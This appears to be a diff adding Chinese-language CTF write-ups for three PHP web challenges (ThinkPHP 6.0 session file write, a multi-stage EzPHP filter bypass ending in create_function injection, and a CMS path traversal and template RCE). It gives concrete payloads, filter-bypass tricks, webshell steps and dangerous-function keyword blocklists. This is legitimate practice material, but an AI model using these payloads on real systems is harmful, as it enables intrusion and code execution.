@@ -5140,3 +5140,202 @@ for i in item:
     {"page":"\u0070\u0068\u0070://filter/convert.base64-encode/resource=/\u0066\u006c\u0061\u0067"}
     ```
     *关键字也可以不用全部替换成unicode编码，替换其中一个字符也可以*
+
+## GYCTF2020 EasyThinking(thinkphp6.0任意文件操作)
+
+[Thinkphp6.0任意文件写入漏洞复现](https://xz.aliyun.com/t/8546?u_atoken=ee6849f24222ce9b4cd8335e522246c0&u_asession=01pIG7wAQppsbmEfGPNeXSJ8breKJRJ8kMGKTJy3nlP9B-dASJ36q5N5tfCxN6V22FdlmHJsN3PcAI060GRB4YZGyPlBJUEqctiaTooWaXr7I&u_asig=05KVH0LapQWTY-1Oi3pZ7BVNoEVXYfTXZC-fpsUZmYRP_deh9ooz-pY2Q32AF4flVS4p56XEtbOBKl76_sr_fHLaD28M-txkpiIMa0GAqCxsy-zX9cwq2P-PsAqjqKyMvD4F3Dji3lGYabOP5JfvofnhJOKGhInEDQi2OqEzFEQ9hg2QMxYs6lyXb1lFWKql56_iZe6qySc4ymSQaSpszAJnRGcYPE2kk-Y5p6oAe-g74pT9Jcu_zyN-D9ZHDSbSngo0RP7qUB-guxC8utCTeI5DcsKDQaZLAWAv_ve_3i6Ex6gx6UxFgdF3ARCQ86jS_u_XR5hatHQVh06VuUZ-D1wA&u_aref=H4PLUP1Jq9daY1QzJQSoB7dSNAc%3D)
+
+### 知识点
+
+**备份文件泄露**
+**ThinkPHP任意文件操作漏洞**
+
+### 解题
+
+1. 打开后，发现有登录、注册、搜索、个人中心这几个功能，测试了一遍没有发现sql注入或者是命令执行的漏洞。尝试访问`/etc/passwd`时，发现了报错信息，提示是thinkphp6.0，去搜索了一下这个框架的漏洞，发现存在任意文件操作漏洞(这个漏洞是在存储session时导致的文件写入，如果session可控的话就会照成任意文件操作或者任意文件删除的漏洞)。但是不知都怎么利用，看了一下wp。
+2. 看了wp才知道，要扫描网站目录，存在源码泄露。首先要找到可以控制session的地方。
+
+    在web\app\home\controller\Member.php
+    ```php
+    public function search()
+    {
+        if (Request::isPost()){
+            # 判断登录
+            if (!session('?UID'))
+            {
+                return redirect('/home/member/login');            
+            }
+            $data = input("post.");
+            $record = session("Record");
+            if (!session("Record"))
+            {
+                // 利用点
+                session("Record",$data["key"]);
+            }
+            else
+            {
+                $recordArr = explode(",",$record);
+                $recordLen = sizeof($recordArr);
+                if ($recordLen >= 3){
+                    array_shift($recordArr);
+                    // 利用点
+                    session("Record",implode(",",$recordArr) . "," . $data["key"]);
+                    return View::fetch("result",["res" => "There's nothing here"]);
+                }
+
+            }
+            session("Record",$record . "," . $data["key"]);
+            return View::fetch("result",["res" => "There's nothing here"]);
+        }else{
+            return View("search");
+        }
+    }
+    ```
+    在Member类中找到 search方法，发现有两处可以通过外部传参设置session的值。
+
+    **getshell**
+
+    接下来注册一个账号，在登录时将cookie改成xxxxx.php(总共32位)
+
+    然后在搜索框写入木马
+
+    蚁剑连接，使用disable_functions插件绕过函数限制，根目录拿到flag
+
+## BJDCTF2020 EzPHP(PHP绕过+代码注入)
+
+### 知识点
+
+   1. $_SERVER 函数中‘QUERY_STRING’
+
+   2. preg_match绕过
+
+   3. $_REQUEST绕过
+
+   4. file_get_contents绕过(文件包含漏洞)
+
+   5. sha1比较
+
+   6. create_function()代码注入
+
+### 解题
+
+打开题目查看源代码，发现注释
+
+base32解码得到1nD3x.php
+
+- **第一步 `QUERY_STRING`绕过**
+    ```php
+    if($_SERVER) { 
+        if (
+            preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
+            )  
+            die('You seem to want to do something bad?'); 
+    } 
+    ```
+    `$_SERVER['QUERY_STRING']`不会进行urldecode，`$_GET[]`会，用url编码可以绕过
+
+- **第二步 preg_match绕过**
+    ```php
+    if (!preg_match('/http|https/i', $_GET['file'])) {
+        if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
+            $file = $_GET["file"]; 
+            echo "Neeeeee! Good Job!<br>";
+        } 
+    } else die('fxck you! What do you want to do ?!'); 
+    ```
+    和之前遇到的题一样，preg_match会自动忽略换行符，字符串末尾加上`%0a`来绕过
+
+    payload: `debu=aqua_is_cute%0a`
+
+- **第三步 `$_REQUEST`绕过**
+    ```php
+    if($_REQUEST) { 
+        foreach($_REQUEST as $value) { 
+            if(preg_match('/[a-zA-Z]/i', $value))  
+                die('fxck you! I hate English!'); 
+        } 
+    } 
+    ```
+    `$_REQUEST`在同时接收GET和POST参数时，POST优先级更高,也就是说相同的参数名，POST传入的数据会覆盖GET传入的数据
+
+- **第四步 php伪协议**
+    ```php
+    if (file_get_contents($file) !== 'debu_debu_aqua')
+        die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");
+    ```
+    用`data:text/plain,`,或者`php://input`传入值
+
+    payload: `file=data:text/plain,debu_debu_aqua`
+
+- **第五步 sha1绕过**
+    ```php
+    if ( sha1($shana) === sha1($passwd) && $shana != $passwd )
+    {
+        extract($_GET["flag"]);
+        echo "Very good! you know my password. But what is flag?<br>";
+    } else{
+        die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
+    }
+    ```
+    sha1函数无法处理数组，传入数组时，结果为false
+
+    payload: `shana[]=1&passwd[]=0`
+
+以上五步的payload 经过url编码传入，同时post传入file=1&debu=1
+
+*注意：只对参数名和参数值中的字母进行url编码，符号不要编码，符号编码后没办法正常解析*
+
+- **第六步 create_function()代码注入**
+    ```php
+    if(preg_match('/^[a-z0-9]*$/isD', $code) ||
+    preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
+        die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
+    } else { 
+        include "flag.php";
+        $code('', $arg); 
+    }
+    ```
+
+    `$code`和`$arg`可控，利用`$code('',$arg)`进行`create_function`注入
+    ```php
+    function a('',$arg){
+        return $arg
+    }
+    ```
+    `$arg=}代码;//`,则`}`闭合了函数`a()`，同时//注释了后面的内容
+    ```php
+    function a('',$arg){
+        return }代码;//
+    }
+    ```
+    payload:`flag[code]=create_function&flag[arg]=}var_dump(get_defined_vars());//`
+
+    对参数名称和值进行url编码后放到前五步的payload后面
+
+    访问后会得到flag的位置，因为`inc`被过滤，include用不了，这里用require
+
+    `require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php)`
+
+    对括号中的内容取反然后进行url编码
+
+    payload: `require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f))`
+
+    替换上一步中的var_dump(get_defined_vars())
+
+    得到的内容base64解码获得flag。
+
+## GKCTF2021 easycms(cms漏洞)
+
+首先有个提示，后台密码五位弱口令(这种一般就是初始密码没有改`admin`或者`12345`)
+
+像这种题目给了提示可以搜索一下cms漏洞，会有相应的poc
+
+这道题存在多种解法，任意文件下载，木马getshell，RCE
+
+在进行所有操作前网页会要求创建一个文本文件。
+
+在设计->组件->素材处会发现文件上传，首先随便上传一个txt文件，然后编辑，更改文件名 `../../../../../system/tmp/xxxx`(xxxx是网站提示的文件名，每次都不一样)。之后就能正常操作
+
+任意文件下载：设计->主题->自定义->导出主题，抓包，theme名称就是文件名的base64加密后的内容，可以更改为/flag的base64加密后的内容，用bp重放模块就可以在响应处直接看到flag
+
+RCE：在高级修改模板文件内容为RCE代码就能拿到flag，或者写个木马，蚁剑连接也行。
